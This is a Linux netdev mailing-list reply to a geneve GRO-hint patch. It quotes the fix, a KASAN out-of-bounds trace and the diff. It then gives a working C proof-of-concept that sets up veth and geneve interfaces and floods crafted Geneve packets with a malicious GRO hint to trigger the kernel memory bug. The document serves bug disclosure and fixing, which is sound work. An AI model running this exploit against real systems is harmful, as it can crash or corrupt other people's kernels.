Return-Path: <netdev+bounces-296193-lists+netdev=lfdr.de@vger.kernel.org>
Delivered-To: lists+netdev@lfdr.de
Received: from mail.lfdr.de
	by mail.lfdr.de with LMTP
	id /n09F4w0JWpCEgIAu9opvQ
	(envelope-from <netdev+bounces-296193-lists+netdev=lfdr.de@vger.kernel.org>)
	for <lists+netdev@lfdr.de>; Sun, 07 Jun 2026 11:06:20 +0200
X-Original-To: lists+netdev@lfdr.de
Received: from sea.lore.kernel.org (sea.lore.kernel.org [172.234.253.10])
	by mail.lfdr.de (Postfix) with ESMTPS id A4C7764F34F
	for <lists+netdev@lfdr.de>; Sun, 07 Jun 2026 11:06:19 +0200 (CEST)
Authentication-Results: mail.lfdr.de;
	dkim=pass header.d=asu.edu header.s=google header.b=hYxp1ivS;
	spf=pass (mail.lfdr.de: domain of "netdev+bounces-296193-lists+netdev=lfdr.de@vger.kernel.org" designates 172.234.253.10 as permitted sender) smtp.mailfrom="netdev+bounces-296193-lists+netdev=lfdr.de@vger.kernel.org";
	dmarc=pass (policy=none) header.from=asu.edu;
	arc=pass ("subspace.kernel.org:s=arc-20240116:i=1")
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sea.lore.kernel.org (Postfix) with ESMTP id 66B763007343
	for <lists+netdev@lfdr.de>; Sun,  7 Jun 2026 09:05:49 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 75B1137E2E2;
	Sun,  7 Jun 2026 09:05:48 +0000 (UTC)
X-Original-To: netdev@vger.kernel.org
Received: from mail-pf1-f173.google.com (mail-pf1-f173.google.com [209.85.210.173])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id AC1893803F1
	for <netdev@vger.kernel.org>; Sun,  7 Jun 2026 09:05:39 +0000 (UTC)
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1780823148; cv=none; b=fX8dZqs1FNcCvJWMBCAd/YV/epzQWI37C64Jhqu3S7qTH8WajhWkK1KjHmcILcOIr62ATJGRb2Kcay1mY6UjH5eUV0Nxldy9WsaCX6xB4sTsJdaKE1cOntKDaTY3FeGYWZjffDg75eqGvKbTr9pvGSIpxPIOPAViL8/sLfJrEyk=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1780823148; c=relaxed/simple;
	bh=iCswCpVCDaypVUdpwfkuFuVfGoQeuA7heKOWAqnE14Y=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=mWBh/NYA8KoYvfIlCi43qzu91YzJcfI6Gi13uefqjLbEusPACf39sm0QPDWJlayUVAZeiY8h+UI65cVQcoKIDHiwaYsyF0ghgQ2G8ht3wJt8LFen89EFMZxVHAVFbuYIDvqCOtSu82nh/UJhrkuADyy9Y/CALRuf8L76UGSoY4g=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=hYxp1ivS; arc=none smtp.client-ip=209.85.210.173
Received: by mail-pf1-f173.google.com with SMTP id d2e1a72fcca58-84226d0f1d2so2287484b3a.1
        for <netdev@vger.kernel.org>; Sun, 07 Jun 2026 02:05:39 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1780823138; x=1781427938; darn=vger.kernel.org;
        h=in-reply-to:content-transfer-encoding:content-disposition
         :mime-version:references:message-id:subject:cc:to:from:date:from:to
         :cc:subject:date:message-id:reply-to;
        bh=ZT00o7DKTv0E5LSDrAxsIoUG0GWqQWyLyGLilxEz+zA=;
        b=hYxp1ivS2wX8SV4sJo3wNSioYDD29y90jboUbx7JGuQyVhf3lgtjZLyht5aeJc5P9U
         GhImblm772dZsxY5VYhsOZYXLQoVYOOp1y6881vfACHyD06qdmFdrvKerHI1lJ8Ppipk
         VM0arjVqZBigzp1gYvEQf0DOWhJPv25U1w4Ma0pINjTR5cCf8UrcP0qx8pG5MitH/QQl
         +b1sRoEj7zpCY5ly1dZYcx8eNYwvNucidjHn9LhCgYMDtDXJUdG1h6HbU28PStS/lszN
         uHrPEgOABhpZvNm5tFOsZF6uVG8KaEk71tw4XIO7UEjRT/CfsEyfOr/83Qkm5a24VYO6
         T/9A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1780823138; x=1781427938;
        h=in-reply-to:content-transfer-encoding:content-disposition
         :mime-version:references:message-id:subject:cc:to:from:date:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=ZT00o7DKTv0E5LSDrAxsIoUG0GWqQWyLyGLilxEz+zA=;
        b=otDYfO8Zz5aI2DI8ZKF/azcSWxl4JvRkuvl6AUWdOYWxeIGfyN6DGpPLLngRZU1q4E
         k2X3aZRoxr047fMOO+iHNiJAbWDX6Hxh+qiHuse2OB9x7fO7JZ69ChdAPzbwO37r2nt0
         H01VAC+yTTlSsUXGbrrye8HJwqGw3NCh2OINnP9KIKkKJmrRq7mY8Hs1fRibVfXl2g4p
         hb2WVZnN6jGty6AVbqJwz26c/57Zke8Du8cSm7Qdjx7vMCdPAfEwtbcOGomAjw6XxPp1
         RaPA4nQoshvSGoCG1bufvPZjhOc33Yx8O2b+o3ukWiZK7y7quR04KbZwzGTbTw5giK42
         rbiA==
X-Gm-Message-State: AOJu0YyVUrcFIX4cLXwx9J+kLsafQyXyokPtsiyH2KCDY0vQiYwj/egA
	FADWPdtyyqzkncBVug5xZQNIQbFhSLPtU958RL2wCbixkkkplWchbEsnb8P0ScteHMS6deYMDZc
	JL0CNCQ==
X-Gm-Gg: Acq92OGGp625l8q6ndZSCqNgArfMt4T4UFSLftGzdKJDK2TGh9hXS+Gd8Y4N+HFQ8gU
	tBK6snlm9ECwaiPkL8xqQfzzOyQ3WUjrGVNdzKYuUpHUGgKNnLizWnB03FTYDtMa6r8dh4UGIZq
	p1joaXQuIoG2znthc01XasVrshzH/LLfgucJMeB6wX8cy7LH3ACDqbtmIWVV/bdk/sWe33/nAwe
	tto4jhXDqIHm/2/ZhtT2/AfBmFAqf+WoKzPINNqSqF7BVS2qRXEPef4Vzfvhg0Txy8VAv8yQFkm
	5G1O5aDqpCh/d8yrdOWWUknxyNzyp3bOkt2NGuS+W89SnSBT5zSxbJq3zzxczJucOJ6dt6AT2o6
	BtsxlF8sQDpgyo9fR1s9vsS8R4RJYBZ6wZc7gvSS4Z1u4LlFwIvcqBOJeEwVRX5kBniI9Oxbled
	KSozF5EX1k7ACS
X-Received: by 2002:a05:6a00:b806:b0:842:4f49:71bc with SMTP id d2e1a72fcca58-842b0ece67emr11340699b3a.46.1780823138374;
        Sun, 07 Jun 2026 02:05:38 -0700 (PDT)
Received: from p1 ([73.140.210.38])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-84282221086sm14659983b3a.10.2026.06.07.02.05.37
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 07 Jun 2026 02:05:38 -0700 (PDT)
Date: Sun, 7 Jun 2026 02:05:36 -0700
From: Xiang Mei <xmei5@asu.edu>
To: netdev@vger.kernel.org
Cc: Paolo Abeni <pabeni@redhat.com>, Jakub Kicinski <kuba@kernel.org>, 
	Eric Dumazet <edumazet@google.com>, Andrew Lunn <andrew+netdev@lunn.ch>, 
	"David S . Miller" <davem@davemloft.net>, Weiming Shi <bestswngs@gmail.com>
Subject: Re: [PATCH net] geneve: gate GRO hint in geneve_gro_complete() on
 gs->gro_hint
Message-ID: <2odgbb7iyvpraekajkt6ec5zdujxc3ujfhxelhwhyd7gbaafyg@jsfjjdusroxj>
References: <20260607085611.3359742-1-xmei5@asu.edu>
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <20260607085611.3359742-1-xmei5@asu.edu>
X-Rspamd-Action: no action
X-Spamd-Result: default: False [-0.16 / 15.00];
	SUSPICIOUS_RECIPS(1.50)[];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
	MID_RHS_NOT_FQDN(0.50)[];
	DMARC_POLICY_ALLOW(-0.50)[asu.edu,none];
	R_SPF_ALLOW(-0.20)[+ip4:172.234.253.10:c];
	R_DKIM_ALLOW(-0.20)[asu.edu:s=google];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	FREEMAIL_CC(0.00)[redhat.com,kernel.org,google.com,lunn.ch,davemloft.net,gmail.com];
	TAGGED_FROM(0.00)[bounces-296193-lists,netdev=lfdr.de];
	FROM_HAS_DN(0.00)[];
	FORGED_RECIPIENTS(0.00)[m:netdev@vger.kernel.org,m:pabeni@redhat.com,m:kuba@kernel.org,m:edumazet@google.com,m:andrew+netdev@lunn.ch,m:davem@davemloft.net,m:bestswngs@gmail.com,m:andrew@lunn.ch,s:lists@lfdr.de];
	FORWARDED(0.00)[lists@lfdr.de];
	RCVD_TLS_LAST(0.00)[];
	FORGED_SENDER_MAILLIST(0.00)[];
	FORGED_SENDER(0.00)[xmei5@asu.edu,netdev@vger.kernel.org];
	DKIM_TRACE(0.00)[asu.edu:+];
	ASN(0.00)[asn:63949, ipnet:172.234.224.0/19, country:SG];
	MISSING_XM_UA(0.00)[];
	FORGED_SENDER_FORWARDING(0.00)[];
	RCVD_COUNT_FIVE(0.00)[5];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[xmei5@asu.edu,netdev@vger.kernel.org];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	ALIAS_RESOLVED(0.00)[];
	FORGED_RECIPIENTS_FORWARDING(0.00)[];
	MIME_TRACE(0.00)[0:+];
	RCPT_COUNT_SEVEN(0.00)[7];
	RCVD_VIA_SMTP_AUTH(0.00)[];
	TAGGED_RCPT(0.00)[netdev];
	TO_DN_SOME(0.00)[]
X-Rspamd-Server: lfdr
X-Rspamd-Queue-Id: A4C7764F34F

On Sun, Jun 07, 2026 at 01:56:11AM -0700, Xiang Mei wrote:
> GRO hint handling must be symmetric between the receive and the complete
> paths, but it is not. geneve_gro_receive() reads the hint through
> geneve_sk_gro_hint_off(), which honours it only when the socket was
> configured with IFLA_GENEVE_GRO_HINT (gs->gro_hint); geneve_gro_complete()
> calls the low-level geneve_opt_gro_hint_off() directly and acts on the
> hint regardless.
> 
> On a tunnel without the hint (gs->gro_hint == false, the default), receive
> therefore ignores any hint option a remote peer puts in the frames and
> aggregates them as plain ETH_P_TEB, while complete still honours it: it
> inflates gh_len by the attacker-controlled gro_hint->nested_hdr_len (u8)
> and redirects the dispatch type to ETH_P_IP / ETH_P_IPV6. The inner
> gro_complete handler then runs at nhoff + gh_len, an offset receive never
> validated nor pulled, and reads the inner L3 header out of bounds of the
> aggregated skb head:
> 
>   BUG: KASAN: slab-out-of-bounds in ipv6_gro_complete (net/ipv6/ip6_offload.c:196)
>   Read of size 1 at addr ffff88800fe91980 by task exploit/153
>    ipv6_gro_complete (net/ipv6/ip6_offload.c:196)
>    geneve_gro_complete (drivers/net/geneve.c:965)
>    udp_gro_complete (net/ipv4/udp_offload.c:940)
>    inet_gro_complete (net/ipv4/af_inet.c:1621)
>    __gro_flush (net/core/gro.c:306)
>    napi_complete_done (include/net/gro.h:530)
>    veth_poll (drivers/net/veth.c:987)
>    __napi_poll (net/core/dev.c:7733)
>    net_rx_action (net/core/dev.c:7953)
>    handle_softirqs (kernel/softirq.c:622)
>    ...
>   The buggy address belongs to the cache skbuff_small_head of size 704
>   The buggy address is located 0 bytes to the right of
>    allocated 704-byte region [ffff88800fe916c0, ffff88800fe91980)
> 
> Restore the symmetry by having geneve_gro_complete() go through
> geneve_sk_gro_hint_off() as well, so both paths gate on gs->gro_hint.
> Tunnels that enable the hint are unaffected.
> 
> Fixes: fd0dd796576e ("geneve: use GRO hint option in the RX path")
> Reported-by: Weiming Shi <bestswngs@gmail.com>
> Assisted-by: Claude:claude-opus-4-8
> Signed-off-by: Xiang Mei <xmei5@asu.edu>
> ---
>  drivers/net/geneve.c | 2 +-
>  1 file changed, 1 insertion(+), 1 deletion(-)
> 
> diff --git a/drivers/net/geneve.c b/drivers/net/geneve.c
> index 715180c3a1b3..97b203fdb753 100644
> --- a/drivers/net/geneve.c
> +++ b/drivers/net/geneve.c
> @@ -954,7 +954,7 @@ static int geneve_gro_complete(struct sock *sk, struct sk_buff *skb,
>  	gh = (struct genevehdr *)(skb->data + nhoff);
>  	gh_len = geneve_hlen(gh);
>  	type = gh->proto_type;
> -	geneve_opt_gro_hint_off(gh, &type, &gh_len);
> +	geneve_sk_gro_hint_off(sk, gh, &type, &gh_len);
>  
>  	/* since skb->encapsulation is set, eth_gro_complete() sets the inner mac header */
>  	if (likely(type == htons(ETH_P_TEB)))
> -- 
> 2.43.0
>
Thanks for your attention to this bug. Here is some information to
reproduce it.

Config:
```
CONFIG_GENEVE=y
CONFIG_VETH=y
CONFIG_PACKET=y
CONFIG_INET=y
CONFIG_IPV6=y
CONFIG_KASAN=y
```

PoC:
```c
#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/if_addr.h>
#include <linux/if_link.h>
#include <linux/ethtool.h>
#include <linux/sockios.h>

struct iphdr {
    uint8_t  ihl:4, version:4;
    uint8_t  tos;
    uint16_t tot_len, id, frag_off;
    uint8_t  ttl, protocol;
    uint16_t check;
    uint32_t saddr, daddr;
} __attribute__((packed));

struct udphdr {
    uint16_t source, dest, len, check;
} __attribute__((packed));

#define GENEVE_UDP_PORT          6081
#define GENEVE_OPT_NETDEV_CLASS  0x100

struct genevehdr {
    uint8_t opt_len:6, ver:2;
    uint8_t rsvd1:6, critical:1, oam:1;
    uint16_t proto_type;
    uint8_t vni[3], rsvd2;
} __attribute__((packed));

struct geneve_opt_hdr {
    uint16_t opt_class;
    uint8_t  type;
    uint8_t  length:5, r3:1, r2:1, r1:1;
} __attribute__((packed));

struct geneve_opt_gro_hint {
    uint8_t inner_proto_id:2, nested_is_v6:1, _unused:5;
    uint8_t nested_nh_offset, nested_tp_offset, nested_hdr_len;
} __attribute__((packed));

static uint32_t nl_seq = 1;

static int nl_open(void) {
    int s = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
    bind(s, (struct sockaddr *)&sa, sizeof(sa));
    return s;
}

static int nl_send_recv(int s, struct nlmsghdr *nh) {
    nh->nlmsg_seq = ++nl_seq;
    nh->nlmsg_flags |= NLM_F_REQUEST | NLM_F_ACK;
    struct iovec iov = { nh, nh->nlmsg_len };
    struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
    struct msghdr msg = { .msg_name = &sa, .msg_namelen = sizeof(sa),
                          .msg_iov = &iov, .msg_iovlen = 1 };
    if (sendmsg(s, &msg, 0) < 0) return -1;
    char buf[8192];
    iov.iov_base = buf;
    iov.iov_len = sizeof(buf);
    int len = recvmsg(s, &msg, 0);
    for (struct nlmsghdr *h = (struct nlmsghdr *)buf; NLMSG_OK(h, len);
         h = NLMSG_NEXT(h, len)) {
        if (h->nlmsg_type == NLMSG_ERROR) {
            struct nlmsgerr *e = NLMSG_DATA(h);
            if (e->error) { errno = -e->error; return -1; }
        }
    }
    return 0;
}

static void nla_put(struct nlmsghdr *nh, int type, const void *data, int len) {
    struct rtattr *rta = (struct rtattr *)((char *)nh + NLMSG_ALIGN(nh->nlmsg_len));
    rta->rta_type = type;
    rta->rta_len = RTA_LENGTH(len);
    if (data && len) memcpy(RTA_DATA(rta), data, len);
    nh->nlmsg_len = NLMSG_ALIGN(nh->nlmsg_len) + RTA_ALIGN(RTA_LENGTH(len));
}

static struct rtattr *nla_nest_start(struct nlmsghdr *nh, int type) {
    struct rtattr *nest = (struct rtattr *)((char *)nh + NLMSG_ALIGN(nh->nlmsg_len));
    nest->rta_type = type | NLA_F_NESTED;
    nest->rta_len = RTA_LENGTH(0);
    nh->nlmsg_len = NLMSG_ALIGN(nh->nlmsg_len) + RTA_LENGTH(0);
    return nest;
}
static void nla_nest_end(struct nlmsghdr *nh, struct rtattr *nest) {
    nest->rta_len = (char *)nh + nh->nlmsg_len - (char *)nest;
}

static int create_veth(int s, const char *name1, const char *name2) {
    char buf[1024] = {0};
    struct nlmsghdr *nh = (struct nlmsghdr *)buf;
    nh->nlmsg_type = RTM_NEWLINK;
    nh->nlmsg_flags = NLM_F_CREATE | NLM_F_EXCL;
    nh->nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
    ((struct ifinfomsg *)NLMSG_DATA(nh))->ifi_family = AF_UNSPEC;
    nla_put(nh, IFLA_IFNAME, name1, strlen(name1) + 1);
    struct rtattr *linfo = nla_nest_start(nh, IFLA_LINKINFO);
    nla_put(nh, IFLA_INFO_KIND, "veth", 4);
    struct rtattr *idata = nla_nest_start(nh, IFLA_INFO_DATA);
    struct rtattr *peer = (struct rtattr *)((char *)nh + NLMSG_ALIGN(nh->nlmsg_len));
    peer->rta_type = 1 | NLA_F_NESTED;
    peer->rta_len = RTA_LENGTH(sizeof(struct ifinfomsg));
    memset(RTA_DATA(peer), 0, sizeof(struct ifinfomsg));
    nh->nlmsg_len = NLMSG_ALIGN(nh->nlmsg_len) + RTA_LENGTH(sizeof(struct ifinfomsg));
    nla_put(nh, IFLA_IFNAME, name2, strlen(name2) + 1);
    peer->rta_len = (char *)nh + nh->nlmsg_len - (char *)peer;
    nla_nest_end(nh, idata);
    nla_nest_end(nh, linfo);
    return nl_send_recv(s, nh);
}

static int create_geneve_external(int s, const char *name) {
    char buf[1024] = {0};
    struct nlmsghdr *nh = (struct nlmsghdr *)buf;
    nh->nlmsg_type = RTM_NEWLINK;
    nh->nlmsg_flags = NLM_F_CREATE | NLM_F_EXCL;
    nh->nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
    ((struct ifinfomsg *)NLMSG_DATA(nh))->ifi_family = AF_UNSPEC;
    nla_put(nh, IFLA_IFNAME, name, strlen(name) + 1);
    struct rtattr *linfo = nla_nest_start(nh, IFLA_LINKINFO);
    nla_put(nh, IFLA_INFO_KIND, "geneve", 6);
    struct rtattr *idata = nla_nest_start(nh, IFLA_INFO_DATA);
    nla_put(nh, IFLA_GENEVE_COLLECT_METADATA, NULL, 0);
    uint16_t port = htons(GENEVE_UDP_PORT);
    nla_put(nh, IFLA_GENEVE_PORT, &port, 2);
    nla_nest_end(nh, idata);
    nla_nest_end(nh, linfo);
    return nl_send_recv(s, nh);
}

static int link_up(int s, const char *name) {
    char buf[512] = {0};
    struct nlmsghdr *nh = (struct nlmsghdr *)buf;
    nh->nlmsg_type = RTM_NEWLINK;
    nh->nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
    struct ifinfomsg *ifi = NLMSG_DATA(nh);
    ifi->ifi_family = AF_UNSPEC;
    ifi->ifi_index = if_nametoindex(name);
    ifi->ifi_flags = ifi->ifi_change = IFF_UP;
    return nl_send_recv(s, nh);
}

/* Toggle netdev features via ETHTOOL_SFEATURES. */
static int ethtool_set_feat(const char *ifname, uint64_t valid, uint64_t req) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr = {0};
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    struct {
        struct ethtool_sfeatures cmd;
        struct ethtool_set_features_block block[4];
    } r;
    memset(&r, 0, sizeof(r));
    r.cmd.cmd = ETHTOOL_SFEATURES;
    r.block[0].valid = valid;
    r.block[0].requested = req;
    r.block[1].valid = valid >> 32;
    r.block[1].requested = req >> 32;
    ifr.ifr_data = (void *)&r;
    int sizes[] = {3, 2, 4, 1}, rc = -1;
    for (int i = 0; i < 4; i++) {
        r.cmd.size = sizes[i];
        rc = ioctl(s, SIOCETHTOOL, &ifr);
        if (rc == 0 || errno != EINVAL) break;
    }
    close(s);
    return rc;
}

#define F_GRO          14
#define F_GRO_FRAGLIST 57
#define F_GRO_UDP_FWD  59
#define BIT64(n) ((uint64_t)1 << (n))
/* All NETIF_F_GSO_* bits (11,16-35) — cleared on v0 so AF_PACKET skbs stay
 * GRO-eligible on the veth peer. */
#define GSO_ALL_MASK (BIT64(11) | (((BIT64(35 - 16 + 1) - 1)) << 16))

static uint16_t ip_csum(const void *data, size_t len) {
    const uint16_t *p = data;
    uint32_t sum = 0;
    while (len > 1) { sum += *p++; len -= 2; }
    if (len) sum += *(const uint8_t *)p;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return ~sum;
}

static uint16_t udp_csum_v4(uint32_t s, uint32_t d, const uint8_t *p, size_t len) {
    uint32_t sum = (s >> 16) + (s & 0xffff) + (d >> 16) + (d & 0xffff) +
                   htons(17) + htons((uint16_t)len);
    const uint16_t *w = (const uint16_t *)p;
    size_t l = len;
    while (l > 1) { sum += *w++; l -= 2; }
    if (l) sum += *(const uint8_t *)w;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    uint16_t c = ~sum;
    return c ? c : 0xffff;
}

#define PAD_OPTS 61

static size_t build_packet(uint8_t *buf, uint16_t sport, uint32_t sip, uint32_t dip) {
    struct iphdr *iph = (struct iphdr *)buf;
    struct udphdr *uh = (struct udphdr *)(iph + 1);
    struct genevehdr *gh = (struct genevehdr *)(uh + 1);
    struct geneve_opt_hdr *opt = (struct geneve_opt_hdr *)(gh + 1);
    struct geneve_opt_gro_hint *hint = (struct geneve_opt_gro_hint *)(opt + 1);

    uint8_t *pad = (uint8_t *)hint + 4;
    for (int j = 0; j < PAD_OPTS; j++) {
        struct geneve_opt_hdr *o = (struct geneve_opt_hdr *)(pad + j * 4);
        o->opt_class = htons(0xffff);
        o->type = 0x42;
        o->length = 0;
    }
    uint8_t *inner = pad + PAD_OPTS * 4;

    memset(inner, 0xcc, 12);
    *(uint16_t *)(inner + 12) = htons(ETH_P_IP);

    struct iphdr *iip = (struct iphdr *)(inner + 14);
    iip->ihl = 5; iip->version = 4;
    iip->tot_len = htons(sizeof(*iip) + sizeof(struct udphdr) + 8);
    iip->frag_off = htons(0x4000);
    iip->ttl = 64; iip->protocol = 17;
    iip->saddr = inet_addr("1.2.3.4");
    iip->daddr = inet_addr("5.6.7.8");
    iip->check = ip_csum(iip, sizeof(*iip));

    struct udphdr *iudp = (struct udphdr *)(iip + 1);
    iudp->source = htons(40000); iudp->dest = htons(40001);
    iudp->len = htons(sizeof(*iudp) + 8);
    memset((uint8_t *)(iudp + 1), 0xAA, 8);
    iudp->check = udp_csum_v4(iip->saddr, iip->daddr, (uint8_t *)iudp, sizeof(*iudp) + 8);

    size_t inner_len = 14 + sizeof(*iip) + sizeof(*iudp) + 8;
    size_t gpayload = sizeof(*gh) + 8 + PAD_OPTS * 4 + inner_len;

    gh->opt_len = 2 + PAD_OPTS;
    gh->proto_type = htons(0x6558);
    gh->vni[2] = 42;

    opt->opt_class = htons(GENEVE_OPT_NETDEV_CLASS);
    opt->type = 1;
    opt->length = 1;
    hint->inner_proto_id = 1;
    hint->nested_tp_offset = 20;
    hint->nested_hdr_len = 255;

    uh->source = htons(sport);
    uh->dest = htons(GENEVE_UDP_PORT);
    uh->len = htons(sizeof(*uh) + gpayload);

    iph->ihl = 5; iph->version = 4;
    iph->tot_len = htons(sizeof(*iph) + sizeof(*uh) + gpayload);
    iph->frag_off = htons(0x4000);
    iph->ttl = 64; iph->protocol = 17;
    iph->saddr = sip; iph->daddr = dip;
    iph->check = ip_csum(iph, sizeof(*iph));

    return sizeof(*iph) + sizeof(*uh) + gpayload;
}

static int get_mac(const char *name, uint8_t *mac) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr = {0};
    strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
    if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) { close(s); return -1; }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(s);
    return 0;
}

struct ctx { int idx; uint32_t sip, dip; uint8_t dmac[6], smac[6]; int tid; };

#define BATCH_N 32

static void *attack_thread(void *arg) {
    struct ctx *c = arg;
    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
    if (s < 0) return NULL;

    uint8_t frames[BATCH_N][2048];
    struct iovec iovs[BATCH_N];
    struct mmsghdr msgs[BATCH_N];
    struct sockaddr_ll sll[BATCH_N];

    for (int round = 0; round < 5000; round++) {
        for (int i = 0; i < BATCH_N; i++) {
            uint8_t *f = frames[i];
            memset(f, 0, 2048);
            memcpy(f, c->dmac, 6);
            memcpy(f + 6, c->smac, 6);
            *(uint16_t *)(f + 12) = htons(ETH_P_IP);
            size_t l = build_packet(f + 14, 10000 + c->tid, c->sip, c->dip);
            iovs[i].iov_base = f;
            iovs[i].iov_len = 14 + l;
            memset(&sll[i], 0, sizeof(sll[i]));
            sll[i].sll_family = AF_PACKET;
            sll[i].sll_ifindex = c->idx;
            sll[i].sll_halen = 6;
            memcpy(sll[i].sll_addr, c->dmac, 6);
            memset(&msgs[i], 0, sizeof(msgs[i]));
            msgs[i].msg_hdr.msg_name = &sll[i];
            msgs[i].msg_hdr.msg_namelen = sizeof(sll[i]);
            msgs[i].msg_hdr.msg_iov = &iovs[i];
            msgs[i].msg_hdr.msg_iovlen = 1;
        }
        sendmmsg(s, msgs, BATCH_N, 0);
    }
    close(s);
    return NULL;
}

#define NTHREADS 4

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("[*] geneve_gro_complete OOB PoC\n");

    int nl = nl_open();
    create_veth(nl, "v0", "v1");
    create_geneve_external(nl, "gnv0");

    link_up(nl, "v0");
    link_up(nl, "v1");
    link_up(nl, "gnv0");

    ethtool_set_feat("v1", BIT64(F_GRO) | BIT64(F_GRO_FRAGLIST) | BIT64(F_GRO_UDP_FWD),
                           BIT64(F_GRO) | BIT64(F_GRO_FRAGLIST) | BIT64(F_GRO_UDP_FWD));
    ethtool_set_feat("v0", BIT64(F_GRO) | GSO_ALL_MASK, BIT64(F_GRO));
    ethtool_set_feat("v1", GSO_ALL_MASK, 0);

    int v0_idx = if_nametoindex("v0");
    uint8_t v0_mac[6], v1_mac[6];
    get_mac("v0", v0_mac);
    get_mac("v1", v1_mac);

    uint32_t a1 = inet_addr("10.0.0.1"), a2 = inet_addr("10.0.0.2");
    printf("[*] firing malicious geneve packets...\n");

    pthread_t ts[NTHREADS];
    struct ctx ctxs[NTHREADS];
    for (int i = 0; i < NTHREADS; i++) {
        ctxs[i] = (struct ctx){ .idx = v0_idx, .sip = a1, .dip = a2, .tid = i };
        memcpy(ctxs[i].dmac, v1_mac, 6);
        memcpy(ctxs[i].smac, v0_mac, 6);
        pthread_create(&ts[i], NULL, attack_thread, &ctxs[i]);
    }
    for (int i = 0; i < NTHREADS; i++) pthread_join(ts[i], NULL);

    printf("[*] done\n");
    sleep(3);
    return 0;
}
```

Let me know if you have any questions about this bug.

Xiang

